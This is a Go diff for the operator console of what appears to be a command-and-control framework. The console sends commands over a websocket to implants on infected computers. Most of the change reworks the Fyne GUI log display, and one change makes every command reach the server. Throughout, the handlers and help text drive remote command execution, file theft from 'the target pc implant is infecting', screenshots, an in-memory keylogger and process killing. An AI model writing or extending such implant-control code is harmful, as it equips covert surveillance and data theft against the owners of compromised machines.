@@ -5,6 +5,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"fyne.io/fyne/v2"
+	"fyne.io/fyne/v2/container"
+	"fyne.io/fyne/v2/driver/desktop"
+	"fyne.io/fyne/v2/layout"
 	"fyne.io/fyne/v2/widget"
 	"log"
 	"strconv"
@@ -50,18 +53,10 @@ func ParseImplantCommand(Command string) {
 	ImplantsInteractionMenus[ImplantName].EntryBar.SetText("")
 	menuobj = ImplantsInteractionMenus[ImplantName]
 
-	//save the previous text in the log.
-	if menuobj != nil {
-		menuobj.PreviousText = menuobj.ImplantLog.Text
-	} else {
-		log.Println("[error] unable to find menu object for implant: ", ImplantName)
-		return
-	}
-
 	if subcmd != "" {
-		PrevCmdWSub = "\n> " + cmd + " " + subcmd + "\n"
+		PrevCmdWSub = "> " + cmd + " " + subcmd + "\n"
 	} else {
-		PrevCmd = "\n> " + cmd + "\n"
+		PrevCmd = "> " + cmd + "\n"
 	}
 
 	switch strings.ToLower(cmd) {
@@ -69,212 +64,214 @@ func ParseImplantCommand(Command string) {
 		if subcmd != "" {
 			switch strings.ToLower(subcmd) {
 			case "execute":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Execute Command Help:\n" +
-					"Execute a command on the implant.\n" +
-					"usage: execute <command>\n" +
-					"example: execute whoami\n" +
-					"example: exec \"powershell -c 'whoami'\"\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Execute Command Help:\n"+
+					"Execute a command on the implant.\n"+
+					"usage: execute <command>\n"+
+					"example: execute whoami\n"+
+					"example: exec \"powershell -c 'whoami'\"\n", "\n")...)
 				break
 
 			case "exec":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Execute Command Help:\n" +
-					"Execute a command on the implant.\n" +
-					"usage: execute <command>\n" +
-					"example: execute whoami\n" +
-					"example: exec \"powershell -c 'whoami'\"\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Execute Command Help:\n"+
+					"Execute a command on the implant.\n"+
+					"usage: execute <command>\n"+
+					"example: execute whoami\n"+
+					"example: exec \"powershell -c 'whoami'\"\n", "\n")...)
 				break
 
 			case "download":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Download Command Help:\n" +
-					"Download a file from the target pc implant is infecting.\n" +
-					"usage: download <remote file location> <local file location>\n" +
-					"example: download C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Download Command Help:\n"+
+					"Download a file from the target pc implant is infecting.\n"+
+					"usage: download <remote file location> <local file location>\n"+
+					"example: download C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n", "\n")...)
 				break
 
 			case "upload":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Upload Command Help:\n" +
-					"Upload a file to the target pc implant is infecting.\n" +
-					"usage: upload <local file location> <remote file location>\n" +
-					"example: upload C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Upload Command Help:\n"+
+					"Upload a file to the target pc implant is infecting.\n"+
+					"usage: upload <local file location> <remote file location>\n"+
+					"example: upload C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n", "\n")...)
+
 				break
 
 			case "screenshot":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Screenshot Command Help:\n" +
-					"Take a screenshot of the desktop.\n" +
-					"usage: screenshot\n" +
-					"example: screenshot\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Screenshot Command Help:\n"+
+					"Take a screenshot of the desktop.\n"+
+					"usage: screenshot\n"+
+					"example: screenshot\n", "\n")...)
+
 				break
 
 			case "keylogger":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Keylogger Command Help:\n" +
-					"Start / Stop Keylogger on implant. This will be a reflected application loaded into memory.\n" +
-					"usage: keylogger start <local file storage location> \n" +
-					"example: keylogger start C:\\Users\\user\\Documents\\keylog.txt\n" +
-					"example: keylogger stop\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Keylogger Command Help:\n"+
+					"Start / Stop Keylogger on implant. This will be a reflected application loaded into memory.\n"+
+					"usage: keylogger start <local file storage location> \n"+
+					"example: keylogger start C:\\Users\\user\\Documents\\keylog.txt\n"+
+					"example: keylogger stop\n", "\n")...)
 				break
 
 			case "shutdown":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Shutdown Command Help:\n" +
-					"Kill the implant.\n" +
-					"usage: shutdown\n" +
-					"example: shutdown\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Shutdown Command Help:\n"+
+					"Kill the implant.\n"+
+					"usage: shutdown\n"+
+					"example: shutdown\n", "\n")...)
 				break
 
 			case "sleep":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Sleep Command Help:\n" +
-					"Set new sleep time on implant\n" +
-					"usage: sleep <time in seconds>\n" +
-					"example: sleep 60\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Sleep Command Help:\n"+
+					"Set new sleep time on implant\n"+
+					"usage: sleep <time in seconds>\n"+
+					"example: sleep 60\n", "\n")...)
 				break
 
 			case "list":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Command Help:\n" +
-					"List all files in the current directory. The opt: means optional\n" +
-					"usage: list, ls, dir <opt: directory>\n" +
-					"example: list C:\\Users\\user\\Documents\n" +
-					"example: ls\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Command Help:\n"+
+					"List all files in the current directory. The opt: means optional\n"+
+					"usage: list, ls, dir <opt: directory>\n"+
+					"example: list C:\\Users\\user\\Documents\n"+
+					"example: ls\n", "\n")...)
 				break
 
 			case "ls":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Command Help:\n" +
-					"List all files in the current directory. The opt: means optional\n" +
-					"usage: list, ls, dir <opt: directory>\n" +
-					"example: list C:\\Users\\user\\Documents\n" +
-					"example: ls\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Command Help:\n"+
+					"List all files in the current directory. The opt: means optional\n"+
+					"usage: list, ls, dir <opt: directory>\n"+
+					"example: list C:\\Users\\user\\Documents\n"+
+					"example: ls\n", "\n")...)
 				break
 
 			case "dir":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Command Help:\n" +
-					"List all files in the current directory. The opt: means optional\n" +
-					"usage: list, ls, dir <opt: directory>\n" +
-					"example: list C:\\Users\\user\\Documents\n" +
-					"example: ls\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Command Help:\n"+
+					"List all files in the current directory. The opt: means optional\n"+
+					"usage: list, ls, dir <opt: directory>\n"+
+					"example: list C:\\Users\\user\\Documents\n"+
+					"example: ls\n", "\n")...)
 				break
 
 			case "cd":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "CD Command Help:\n" +
-					"Change working directory on implant.\n" +
-					"usage: cd <directory>\n" +
-					"example: cd C:\\Users\\user\\Documents\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"CD Command Help:\n"+
+					"Change working directory on implant.\n"+
+					"usage: cd <directory>\n"+
+					"example: cd C:\\Users\\user\\Documents\n", "\n")...)
 				break
 
 			case "pwd":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "PWD Command Help:\n" +
-					"Print working directory on implant.\n" +
-					"usage: pwd\n" +
-					"example: pwd\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"PWD Command Help:\n"+
+					"Print working directory on implant.\n"+
+					"usage: pwd\n"+
+					"example: pwd\n", "\n")...)
 				break
 
 			case "ps":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "PS Command Help:\n" +
-					"List all running processes on implant.\n" +
-					"usage: ps, proc\n" +
-					"example: ps\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"PS Command Help:\n"+
+					"List all running processes on implant.\n"+
+					"usage: ps, proc\n"+
+					"example: ps\n", "\n")...)
 				break
 
 			case "proc":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "PS Command Help:\n" +
-					"List all running processes on implant.\n" +
-					"usage: ps, proc\n" +
-					"example: ps\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"PS Command Help:\n"+
+					"List all running processes on implant.\n"+
+					"usage: ps, proc\n"+
+					"example: ps\n", "\n")...)
 				break
 
 			case "kill":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Kill Command Help:\n" +
-					"Kill a process on the implant.\n" +
-					"usage: kill <process id>\n" +
-					"example: kill 1234\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Kill Command Help:\n"+
+					"Kill a process on the implant.\n"+
+					"usage: kill <process id>\n"+
+					"example: kill 1234\n", "\n")...)
 				break
 
 			case "lm":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "List Modules Command Help:\n" +
-					"List all loaded modules on the implant.\n" +
-					"usage: lm\n" +
-					"example: lm\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"List Modules Command Help:\n"+
+					"List all loaded modules on the implant.\n"+
+					"usage: lm\n"+
+					"example: lm\n", "\n")...)
 				break
 
 			case "clear":
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Clear Command Help:\n" +
-					"Clear the log.\n" +
-					"usage: clear\n" +
-					"example: clear\n")
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Clear Command Help:\n"+
+					"Clear the log.\n"+
+					"usage: clear\n"+
+					"example: clear\n", "\n")...)
 				break
 
 			default:
-				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
+				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+HelpMenuString, "\n")...)
 				break
 			}
 			break
 		} else {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+HelpMenuString, "\n")...)
 			break
 		}
 
 	case "execute":
 		//execute a command on the implant.
 		str := fmt.Sprintf("[*] Executing command %s on implant.\n", strings.Join(args, " "))
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "exec":
 		//execute a command on the implant.
 		str := fmt.Sprintf("[*] Executing command %s on implant.\n", strings.Join(args, " "))
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "download":
 		//download a file from the target pc implant is infecting.
 		if len(args) < 2 {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid download command.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid download command.\n", "\n")...)
 			return
 		}
 		str := fmt.Sprintf("[*] Downloading file %s to location %s from implant.\n", args[0], args[1])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "upload":
 		//upload a file to the target pc implant is infecting.
 		if len(args) < 2 {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid upload command.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid upload command.\n", "\n")...)
 			return
 		}
 		str := fmt.Sprintf("[*] Uploading file %s to location %s implant.\n", args[0], args[1])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "screenshot":
 		//take a screenshot of the desktop.
 		str := fmt.Sprintf("[*] Taking a screenshot of the desktop.\n")
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "keylogger":
 		if len(args) == 0 {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid keylogger command.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid keylogger command.\n", "\n")...)
 			return
 		}
 		str := fmt.Sprintf("[*] %sing keylogger on implant.\n", args[0])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		//start / stop keylogger on implant. This will be a reflected application loaded into memory.
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "shutdown":
 		//kill the implant.
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Killing the implant.\n")
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Killing the implant.\n", "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "sleep":
 		if len(args) == 0 {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid sleep time.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid sleep time.\n", "\n")...)
 			return
 		}
 		arg, err := strconv.Atoi(args[0])
 		if err != nil {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid sleep time.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid sleep time.\n", "\n")...)
 			return
 		}
 		str := fmt.Sprintf("[*] Setting new sleep time on implant to %d seconds.\n", arg)
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		//set new sleep time on implant
 		SendImplantCommand(cmd, args, ImplantName)
 		break
@@ -283,7 +280,7 @@ func ParseImplantCommand(Command string) {
 			args = append(args, ".")
 		}
 		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		//list all files in the current directory.
 		SendImplantCommand(cmd, args, ImplantName)
 		break
@@ -292,7 +289,7 @@ func ParseImplantCommand(Command string) {
 			args = append(args, ".")
 		}
 		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "dir":
@@ -300,60 +297,59 @@ func ParseImplantCommand(Command string) {
 			args = append(args, ".")
 		}
 		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "cd":
 		if len(args) == 0 {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid directory.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid directory.\n", "\n")...)
 			return
 		}
 		//change directory on implant.
 		str := fmt.Sprintf("[*] Changing directory to %s on implant.\n", args[0])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "pwd":
 		//print working directory on implant.
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Printing working directory on the implant.\n")
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Printing working directory on the implant.\n", "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "ps":
 		//list all running processes on implant.
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Listing all running processes on the implant.\n")
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Listing all running processes on the implant.\n", "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "proc":
 		//list all running processes on implant.
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Listing all running processes on the implant.\n")
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Listing all running processes on the implant.\n", "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "kill":
 		//kill a process on the implant.
 		if len(args) == 0 {
-			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid process id.\n")
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid process id.\n", "\n")...)
 			return
 		}
 		str := fmt.Sprintf("[*] Killing process %d on implant.\n", args[0])
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+str, "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "lm":
 		//list all loaded modules on the implant.
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Listing all loaded modules on the implant.\n")
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[*] Listing all loaded modules on the implant.\n", "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "clear":
-		menuobj.ImplantLog.SetText("")
-		menuobj.PreviousText = ""
+		menuobj.Text = []string{}
 		break
 
 	default: //no recognized command print the help menu
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+HelpMenuString, "\n")...)
 		break
 	}
-
 	UpdateCursorRow(ImplantName)
+	menuobj.ImplantLog.Refresh()
 
 }
 
@@ -376,17 +372,12 @@ func SendImplantCommand(Command string, args []string, ImplantName string) {
 	}
 	WSMessage.Message = string(JData)
 
-	switch Command {
-	case "lm":
-		//list all loaded modules on the implant.
-		err = g_clientobj.Conn.WriteJSON(WSMessage)
-		if err != nil {
-			log.Println("[error] attempting to send implant command to the server websocket.", err)
-		}
-
-	default:
-		break
+	//list all loaded modules on the implant.
+	err = g_clientobj.Conn.WriteJSON(WSMessage)
+	if err != nil {
+		log.Println("[error] attempting to send implant command to the server websocket.", err)
 	}
+
 }
 
 func InteractWithImplant(FyneApp fyne.App) {
@@ -404,9 +395,21 @@ func InteractWithImplant(FyneApp fyne.App) {
 	NewWindow := FyneApp.NewWindow("Interact with Implant")
 
 	//Create the form for interacting with the implant.
-	ImplantInteractionMenu.ImplantLog = widget.NewMultiLineEntry()
-	ImplantInteractionMenu.ImplantLog.Disable()
-	ImplantInteractionMenu.ImplantLog.SetMinRowsVisible(30)
+	ImplantInteractionMenu.ImplantLog = widget.NewList(func() int {
+		return len(ImplantInteractionMenu.Text)
+	},
+		func() fyne.CanvasObject {
+			return container.New(layout.CustomPaddedLayout{
+				TopPadding:    -7.5,
+				BottomPadding: -7.5,
+				LeftPadding:   0,
+				RightPadding:  0,
+			}, Common.NewCustomLabelWidget(func(m *desktop.MouseEvent) {}))
+		},
+		func(i widget.ListItemID, obj fyne.CanvasObject) {
+			obj.(*fyne.Container).Objects[0].(*Common.CustomLabelWidget).SetText(ImplantInteractionMenu.Text[i])
+		})
+	ImplantInteractionMenu.ImplantLog.HideSeparators = true
 	ImplantInteractionMenu.ImplantName = ImplantName
 
 	HelpMenuString = fmt.Sprintf("%s Help Menu:\nPlease use all listed commands without the '[,]' characters\n", ImplantName)
@@ -426,7 +429,8 @@ func InteractWithImplant(FyneApp fyne.App) {
 	HelpMenuString += "[lm] - List all loaded modules on the implant.\n"
 	HelpMenuString += "[clear] - Clear the log.\n"
 
-	ImplantInteractionMenu.ImplantLog.SetText(HelpMenuString)
+	ImplantInteractionMenu.Text = append(ImplantInteractionMenu.Text, strings.Split(HelpMenuString, "\n")...)
+	ImplantInteractionMenu.ImplantLog.Refresh()
 
 	ImplantsInteractionMenus[ImplantName] = &ImplantInteractionMenu
 
@@ -438,7 +442,6 @@ func InteractWithImplant(FyneApp fyne.App) {
 	//Teams chat entry's combined into one form.
 	ImplantForm := &widget.Form{
 		Items: []*widget.FormItem{
-			{Text: "", Widget: ImplantInteractionMenu.ImplantLog},
 			{Text: ImplantName, Widget: ImplantInteractionMenu.EntryBar},
 		},
 		OnSubmit: func() {
@@ -448,7 +451,11 @@ func InteractWithImplant(FyneApp fyne.App) {
 		SubmitText: "",
 		CancelText: "Exit",
 	}
-	NewWindow.SetContent(ImplantForm)
+
+	vsplit := container.NewVSplit(ImplantInteractionMenu.ImplantLog, ImplantForm)
+	vsplit.SetOffset(30)
+	vsplit.Refresh()
+	NewWindow.SetContent(vsplit)
 	size := fyne.Size{Height: 700.0, Width: 1080.0}
 	NewWindow.Resize(size)
 	NewWindow.Show()
@@ -547,14 +554,12 @@ func UpdateImplantCheckin(ImplantData Common.ImplantTableData) {
 
 func UpdateCursorRow(ImplantName string) {
 	menuobj := ImplantsInteractionMenus[ImplantName]
-	textlength := len(menuobj.ImplantLog.Text)
-	menuobj.ImplantLog.CursorRow = textlength
+	menuobj.ImplantLog.ScrollToBottom()
 	menuobj.ImplantLog.Refresh()
 }
 
 func SendDataToImplantWindow(ImplantData Common.ImplantTableData, Data interface{}, datatype int) {
 	var (
-		PrevText   = ImplantsInteractionMenus[ImplantData.ImplantName].PreviousText
 		typeofdata string
 		TempData   interface{}
 		menuobj    = ImplantsInteractionMenus[ImplantData.ImplantName]
@@ -564,16 +569,23 @@ func SendDataToImplantWindow(ImplantData Common.ImplantTableData, Data interface
 	case 1: // MODULE DATA
 		typeofdata = "Module Data"
 		TempData = Data.(map[string][]byte)
-		break
+		menuobj.Text = append(menuobj.Text, strings.Split(fmt.Sprintf("[*] Received %s from implant: %s\n", typeofdata, ImplantData.ImplantName), "\n")...)
+		menuobj.ImplantLog.Refresh()
+		var strobj string
+		for key, value := range TempData.(map[string][]byte) {
+			module_name := strings.Split(key, "\\")
+			strobj += fmt.Sprintf("Module: [%s] Loaded at: [0x", module_name[len(module_name)-1])
+			for _, b := range value {
+				strobj += fmt.Sprintf("%02x", b)
+			}
+			strobj += "]\n"
+		}
+
+		menuobj.Text = append(menuobj.Text, strings.Split(strobj, "\n")...)
+		menuobj.ImplantLog.Refresh()
+		break // send module data.
 	default:
-		break
-	}
-	menuobj.ImplantLog.SetText(PrevText + fmt.Sprintf("[*] Received %s from implant: %s\n", ImplantData.ImplantName, typeofdata))
-	menuobj.PreviousText = menuobj.ImplantLog.Text
-	for key, value := range TempData.(map[string][]byte) {
-		module_name := strings.Split(key, "\\")
-		menuobj.ImplantLog.SetText(menuobj.PreviousText + fmt.Sprintf("Module: [%s] Loaded at: [%p]\n", module_name[len(module_name)-1], value))
-		menuobj.PreviousText = menuobj.ImplantLog.Text
+		break // default
 	}
 
 	UpdateCursorRow(ImplantData.ImplantName)
